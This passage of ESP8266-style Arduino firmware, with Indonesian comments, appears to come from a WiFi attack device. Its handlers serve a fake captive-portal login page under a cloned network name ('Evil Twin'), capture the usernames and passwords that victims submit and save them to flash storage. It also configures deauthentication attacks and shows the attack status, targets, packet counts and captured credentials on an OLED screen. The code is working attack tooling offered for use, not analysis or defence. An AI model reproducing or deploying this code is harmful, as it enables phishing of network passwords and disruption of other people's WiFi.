      if (appSettings.enableDebugLogs) Serial.println("[ERROR] Failed to open file for writing during upload: " + filename);
      uploadErrorOccurred = true;
      return; 
    }
  } else if (upload.status == UPLOAD_FILE_WRITE) {
    if (fsUploadFile && !uploadErrorOccurred) {
      fsUploadFile.write(upload.buf, upload.currentSize);
    } else if (!fsUploadFile && !uploadErrorOccurred) {
      if (appSettings.enableDebugLogs) Serial.println("[ERROR] File not open for writing during upload (unexpected).");
      uploadErrorOccurred = true;
    }
  } else if (upload.status == UPLOAD_FILE_END) {
    if (fsUploadFile) {
      fsUploadFile.close();
      if (!uploadErrorOccurred) {
        if (appSettings.enableDebugLogs) Serial.println("\n[FILE] Upload complete: " + upload.filename + ", size: " + String(upload.totalSize));
        webServer.send(200, "application/json", "{\"success\": true, \"message\": \"File uploaded successfully\"}");
      } else {
        if (appSettings.enableDebugLogs) Serial.println("[ERROR] Upload ended with prior error: " + upload.filename);
        webServer.send(500, "application/json", "{\"success\": false, \"message\": \"File write error during upload.\"}");
      }
    } else {
      if (appSettings.enableDebugLogs) Serial.println("[ERROR] File was not properly opened or written to (UPLOAD_FILE_END).");
      webServer.send(500, "application/json", "{\"success\": false, \"message\": \"File handle error at end of upload.\"}");
    }
  } else if (upload.status == UPLOAD_FILE_ABORTED) {
    if (fsUploadFile) {
      fsUploadFile.close();
      SPIFFS.remove(upload.filename);
      if (appSettings.enableDebugLogs) Serial.println("[FILE] Upload aborted: " + upload.filename);
    }
    webServer.send(500, "application/json", "{\"success\": false, \"message\": \"Upload aborted\"}");
  }
}

void handleFileDelete() {
  if (webServer.hasArg("plain")) {
    String body = webServer.arg("plain");
    DynamicJsonDocument doc(256);
    DeserializationError error = deserializeJson(doc, body);

    if (error) {
      webServer.send(400, "application/json", "{\"success\": false, \"message\": \"Invalid JSON\"}");
      return;
    }

    String filename = doc["filename"].as<String>();
    if (!filename.startsWith("/")) filename = "/" + filename;
    if (SPIFFS.exists(filename)) {
      SPIFFS.remove(filename);
      if (appSettings.enableDebugLogs) Serial.println("[FILE] Deleted: " + filename);
      webServer.send(200, "application/json", "{\"success\": true, \"message\": \"File deleted\"}");
    } else {
      if (appSettings.enableDebugLogs) Serial.println("[WARNING] File not found for deletion: " + filename);
      webServer.send(404, "application/json", "{\"success\": false, \"message\": \"File not found\"}");
    }
  } else {
    webServer.send(400, "application/json", "{\"success\": false, \"message\": \"No data provided\"}");
  }
}

void handleCaptivePortal() {
  if (!hotspot_active) {
    webServer.sendHeader("Location", "http://" + apIP.toString() + "/generate_captive_portal", true);
    webServer.send(302, "text/plain", "");
    return;
  }

  String captivePortalHTML = "";
  String templateToLoad = appSettings.defaultCaptivePortalTemplate;

  if (templateToLoad == "custom" && SPIFFS.exists("/captive_portal_template.html")) {
      File file = SPIFFS.open("/captive_portal_template.html", "r");
      if (file) {
          captivePortalHTML = file.readString();
          file.close();
          if (appSettings.enableDebugLogs) Serial.println("[INFO] Serving custom captive portal from SPIFFS.");
      } else {
          if (appSettings.enableDebugLogs) Serial.println("[WARNING] Custom template not found in SPIFFS. Falling back to embedded default.");
          captivePortalHTML = CAPTIVE_PORTAL_TEMPLATE_HTML;
      }
  } else if (templateToLoad == "default") {
      captivePortalHTML = CAPTIVE_PORTAL_TEMPLATE_HTML;
      if (appSettings.enableDebugLogs) Serial.println("[INFO] Serving embedded default captive portal template.");
  }
  else {
      captivePortalHTML = CAPTIVE_PORTAL_TEMPLATE_HTML;
      if (appSettings.enableDebugLogs) Serial.println("[WARNING] Invalid default captive portal template setting or template not found. Serving embedded default.");
  }
  
  captivePortalHTML.replace("{SSID}", _selectedNetwork.ssid);
  captivePortalHTML.replace("{DEVICE_NAME}", APP_NAME);
  captivePortalHTML.replace("{CURRENT_TIME}", String(millis() / 1000) + "s");

  webServer.send(200, "text/html", captivePortalHTML);
}

void handleCaptivePortalSubmit() {
  if (webServer.hasArg("password")) {
    String capturedPassword = webServer.arg("password");
    String capturedUsername = webServer.hasArg("username") ? webServer.arg("username") : "N/A";

    if (capturedPassword.length() < 4) {
        if (appSettings.enableDebugLogs) Serial.println("[WARNING] Captured password too short, likely invalid.");
        String response = "<!DOCTYPE html><html><head><title>Error</title><meta name='viewport' content='width=device-width, initial-scale=1'></head><body>";
        response += "<center><h1>Error!</h1><p>Invalid password. Please try again.</p>";
        response += "<p><a href=\"/generate_captive_portal\">Go Back</a></p></center></body></html>";
        webServer.send(200, "text/html", response);
        return;
    }

    char logBuffer[256];
    snprintf(logBuffer, sizeof(logBuffer), "Captured for SSID: %s, User: %s, Pass: %s (Time: %lus)\n",
             _selectedNetwork.ssid.c_str(), capturedUsername.c_str(), capturedPassword.c_str(), millis() / 1000);
    
    _capturedPasswordsLog += logBuffer;
    saveCapturedPasswords(); // Save to SPIFFS immediately
    lastCapturedCredential = capturedUsername + ":" + capturedPassword; // Update for OLED

    if (appSettings.enableDebugLogs) {
      Serial.print("[SNIFFER] ");
      Serial.println(logBuffer);
    }

    String response = "<!DOCTYPE html><html><head><title>Success</title><meta name='viewport' content='width=device-width, initial-scale=1'></head><body>";
    response += "<center><h1>Thank You!</h1><p>Your connection is being established. Please wait...</p>";
    response += "<p>You may need to reconnect to the network.</p></center></body></html>";
    webServer.send(200, "text/html", response);
  } else {
    webServer.send(200, "text/html", "Password not provided.");
  }
}

void handleRestart() {
  webServer.send(200, "text/html", "<h1>Restarting Device...</h1><p>The device will restart in a few seconds. Please wait.</p>");
  delay(2000);
  ESP.restart();
}

void loadSettings() {
  appSettings.adminApSsid = DEFAULT_ADMIN_AP_SSID;
  appSettings.adminApPassword = DEFAULT_ADMIN_AP_PASSWORD;
  appSettings.enableDebugLogs = false;
  appSettings.defaultCaptivePortalTemplate = "default";
  appSettings.webAdminUsername = "admin";
  appSettings.webAdminPassword = "password";
  appSettings.deauthPacketRate = 1; // Default deauth packet rate

  if (SPIFFS.exists(SETTINGS_FILE)) {
    File settingsFile = SPIFFS.open(SETTINGS_FILE, "r");
    if (settingsFile) {
      DynamicJsonDocument doc(512);
      DeserializationError error = deserializeJson(doc, settingsFile);
      if (!error) {
        appSettings.adminApSsid = doc["adminApSsid"] | appSettings.adminApSsid;
        appSettings.adminApPassword = doc["adminApPassword"] | appSettings.adminApPassword;
        appSettings.enableDebugLogs = doc["enableDebugLogs"] | appSettings.enableDebugLogs;
        appSettings.defaultCaptivePortalTemplate = doc["defaultCaptivePortalTemplate"] | appSettings.defaultCaptivePortalTemplate;
        appSettings.webAdminUsername = doc["webAdminUsername"] | appSettings.webAdminUsername;
        appSettings.webAdminPassword = doc["webAdminPassword"] | appSettings.webAdminPassword;
        appSettings.deauthPacketRate = doc["deauthPacketRate"] | appSettings.deauthPacketRate; // Load deauth packet rate
        if (appSettings.enableDebugLogs) Serial.println("[INFO] Settings loaded from SPIFFS.");
      } else {
        if (appSettings.enableDebugLogs) Serial.println("[ERROR] Failed to parse settings JSON. Using defaults.");
      }
      settingsFile.close();
    } else {
      if (appSettings.enableDebugLogs) Serial.println("[ERROR] Failed to open settings file for reading. Using defaults.");
    }
  } else {
    if (appSettings.enableDebugLogs) Serial.println("[INFO] Settings file not found. Starting fresh.");
    saveSettings();
  }
}

void saveSettings() {
  File settingsFile = SPIFFS.open(SETTINGS_FILE, "w");
  if (settingsFile) {
    DynamicJsonDocument doc(512);
    doc["adminApSsid"] = appSettings.adminApSsid;
    doc["adminApPassword"] = appSettings.adminApPassword;
    doc["enableDebugLogs"] = appSettings.enableDebugLogs;
    doc["defaultCaptivePortalTemplate"] = appSettings.defaultCaptivePortalTemplate;
    doc["webAdminUsername"] = appSettings.webAdminUsername;
    doc["webAdminPassword"] = appSettings.webAdminPassword;
    doc["deauthPacketRate"] = appSettings.deauthPacketRate; // Save deauth packet rate

    if (serializeJson(doc, settingsFile) == 0) {
      if (appSettings.enableDebugLogs) Serial.println("[ERROR] Failed to write settings to file.");
    } else {
      if (appSettings.enableDebugLogs) Serial.println("[INFO] Settings saved to SPIFFS.");
    }
    settingsFile.close();
  } else {
    if (appSettings.enableDebugLogs) Serial.println("[ERROR] Failed to open settings file for writing.");
  }
}

void handleApiGetSettings() {
  DynamicJsonDocument doc(512);
  doc["adminApSsid"] = appSettings.adminApSsid;
  doc["adminApPassword"] = appSettings.adminApPassword;
  doc["enableDebugLogs"] = appSettings.enableDebugLogs;
  doc["defaultCaptivePortalTemplate"] = appSettings.defaultCaptivePortalTemplate;
  doc["webAdminUsername"] = appSettings.webAdminUsername;
  doc["webAdminPassword"] = appSettings.webAdminPassword;
  doc["deauthPacketRate"] = appSettings.deauthPacketRate; // Get deauth packet rate

  String jsonResponse;
  serializeJson(doc, jsonResponse);
  webServer.send(200, "application/json", jsonResponse);
}

void handleApiSaveSettings() {
  if (webServer.hasArg("plain")) {
    String body = webServer.arg("plain");
    DynamicJsonDocument doc(512);
    DeserializationError error = deserializeJson(doc, body);

    if (error) {
      webServer.send(400, "application/json", "{\"success\": false, \"message\": \"Invalid JSON\"}");
      return;
    }

    String newAdminApSsid = doc["adminApSsid"] | appSettings.adminApSsid;
    String newAdminApPassword = doc["adminApPassword"] | appSettings.adminApPassword;
    bool newEnableDebugLogs = doc["enableDebugLogs"] | appSettings.enableDebugLogs;
    String newDefaultCaptivePortalTemplate = doc["defaultCaptivePortalTemplate"] | appSettings.defaultCaptivePortalTemplate;
    String newWebAdminUsername = doc["webAdminUsername"] | appSettings.webAdminUsername;
    String newWebAdminPassword = doc["webAdminPassword"] | appSettings.webAdminPassword;
    int newDeauthPacketRate = doc["deauthPacketRate"] | appSettings.deauthPacketRate; // Get new deauth packet rate

    bool apSettingsChanged = (newAdminApSsid != appSettings.adminApSsid || newAdminApPassword != appSettings.adminApPassword);
    bool webAuthSettingsChanged = (newWebAdminUsername != appSettings.webAdminUsername || newWebAdminPassword != appSettings.webAdminPassword);

    appSettings.adminApSsid = newAdminApSsid;
    appSettings.adminApPassword = newAdminApPassword;
    appSettings.enableDebugLogs = newEnableDebugLogs;
    appSettings.defaultCaptivePortalTemplate = newDefaultCaptivePortalTemplate;
    appSettings.webAdminUsername = newWebAdminUsername;
    appSettings.webAdminPassword = newWebAdminPassword;
    appSettings.deauthPacketRate = newDeauthPacketRate; // Update deauth packet rate

    saveSettings();

    if (apSettingsChanged || webAuthSettingsChanged) {
        if (appSettings.enableDebugLogs) Serial.println("[INFO] Admin AP or Web Auth settings changed. Restarting AP...");
        dnsServer.stop();
        WiFi.softAPdisconnect(true);
        delay(100);
        WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
        WiFi.softAP(appSettings.adminApSsid.c_str(), appSettings.adminApPassword.c_str());
        dnsServer.start(DNS_PORT, "*", apIP);
    }

    webServer.send(200, "application/json", "{\"success\": true, \"message\": \"Settings saved successfully\"}");
  } else {
    webServer.send(400, "application/json", "{\"success\": false, \"message\": \"No data provided\"}");
  }
}

void loadCapturedPasswords() {
  if (SPIFFS.exists(CAPTURED_PASSWORDS_FILE)) {
    File logFile = SPIFFS.open(CAPTURED_PASSWORDS_FILE, "r");
    if (logFile) {
      _capturedPasswordsLog = logFile.readString();
      logFile.close();
      if (appSettings.enableDebugLogs) Serial.println("[INFO] Loaded captured passwords from SPIFFS.");
    } else {
      if (appSettings.enableDebugLogs) Serial.println("[ERROR] Failed to open captured passwords file for reading.");
    }
  } else {
    if (appSettings.enableDebugLogs) Serial.println("[INFO] Captured passwords file not found. Starting fresh.");
  }
}

void saveCapturedPasswords() {
  File logFile = SPIFFS.open(CAPTURED_PASSWORDS_FILE, "w");
  if (logFile) {
    logFile.print(_capturedPasswordsLog);
    logFile.close();
    if (appSettings.enableDebugLogs) Serial.println("[INFO] Saved captured passwords to SPIFFS.");
  } else {
    if (appSettings.enableDebugLogs) Serial.println("[ERROR] Failed to open captured passwords file for writing.");
  }
}

void handleOTAUpdate() {
}

// --- OLED Update Function ---
void updateOLEDDisplay() {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);

  // Baris 0: APP_NAME
  display.setCursor(0, 0);
  display.print(APP_NAME);
  display.drawFastHLine(0, 8, SCREEN_WIDTH, SSD1306_WHITE); // Garis di bawah judul

  // Baris 1: Status Jaringan (AP / STA)
  display.setCursor(0, 10);
  if (hotspot_active) {
    // Jika Evil Twin aktif, tampilkan SSID Evil Twin
    display.print("ET: ");
    String etSsid = _selectedNetwork.ssid;
    if (etSsid.length() > 12) etSsid = etSsid.substring(0, 12) + "...";
    display.print(etSsid);
  } else {
    // Jika tidak, tampilkan Admin AP SSID
    display.print("AP: ");
    String adminSsid = appSettings.adminApSsid;
    if (adminSsid.length() > 12) adminSsid = adminSsid.substring(0, 12) + "...";
    display.print(adminSsid);
  }
  // Tambahkan status STA jika terhubung
  if (WiFi.status() == WL_CONNECTED) {
    display.setCursor(SCREEN_WIDTH / 2, 10); // Pindah ke tengah kanan
    display.print("STA: ");
    String staSsid = WiFi.SSID();
    if (staSsid.length() > 6) staSsid = staSsid.substring(0, 6) + "...";
    display.print(staSsid);
    display.print(" (");
    display.print(WiFi.RSSI());
    display.print(")");
  }

  // Baris 2: Klien & Status Serangan Utama
  display.setCursor(0, 20);
  display.print("Clients: ");
  display.print(WiFi.softAPgetStationNum());

  if (deauthing_active) {
    display.setCursor(SCREEN_WIDTH / 2, 20); // Pindah ke tengah kanan
    if (deauth_all_ssids) {
        display.print("Deauth: ALL");
    } else {
        display.print("Deauth: ON");
    }
  } else if (hotspot_active) {
    display.setCursor(SCREEN_WIDTH / 2, 20); // Pindah ke tengah kanan
    display.print("EvilTwin: ON");
  } else {
    display.setCursor(SCREEN_WIDTH / 2, 20); // Pindah ke tengah kanan
    display.print("Idle");
  }

  // Baris 3: Detail Serangan / Target Jaringan
  display.setCursor(0, 30);
  if (deauth_all_ssids) {
    display.print("Target: All Scanned");
  } else if (_selectedNetwork.ssid != "") {
    display.print("Target: ");
    String targetSsid = _selectedNetwork.ssid;
    if (targetSsid.length() > 14) targetSsid = targetSsid.substring(0, 14) + "...";
    display.print(targetSsid);
  } else {
    display.print("Target: None");
  }

  // Baris 4: Informasi Serangan Lanjutan (jika aktif)
  display.setCursor(0, 40);
  if (deauthing_active) {
    display.print("Pkts: ");
    display.print(deauthPacketCount);
    if (deauth_all_ssids) {
        display.print(" (");
        int numNetworks = 0;
        for(int i = 0; i < 16; ++i) {
            if(_networks[i].ssid == "") break;
            numNetworks++;
        }
        display.print(currentDeauthAllIndex + 1);
        display.print("/");
        display.print(numNetworks);
        display.print(")");
    } else {
        display.print(" Ch: ");
        display.print(_selectedNetwork.ch);
    }
  } else if (hotspot_active) {
    int passwordCount = 0;
    if (_capturedPasswordsLog.length() > 0) {
      for (int i = 0; i < _capturedPasswordsLog.length(); i++) {
        if (_capturedPasswordsLog.charAt(i) == '\n') {
          passwordCount++;
        }
      }
    }
    display.print("Creds: ");
    display.print(passwordCount);
    display.print(" Last: ");
    String lastCred = lastCapturedCredential;
    if (lastCred.length() > 8) lastCred = lastCred.substring(0, 8) + "...";
    display.print(lastCred);
  } else {
    // Tampilkan informasi lain jika tidak ada serangan aktif, misal Free Heap
    display.print("Free Heap: ");
    display.print(ESP.getFreeHeap() / 1024);
    display.print("KB");
  }

  // Baris 5: Uptime (selalu di bagian bawah)
  display.setCursor(0, 54); // Y = 64 (tinggi layar) - 8 (tinggi teks) - 2 (spasi dari bawah) = 54
  display.print("Uptime: ");
  unsigned long seconds = (millis() - startTime) / 1000;
  unsigned long minutes = seconds / 60;
  unsigned long hours = minutes / 60;
  seconds %= 60;
  minutes %= 60;

  if (hours > 0) {
    display.print(hours);
    display.print("h ");
  }
  if (minutes > 0 || hours > 0) {
    display.print(minutes);
    display.print("m ");
  }
  display.print(seconds);
  display.print("s");

  display.display();
}
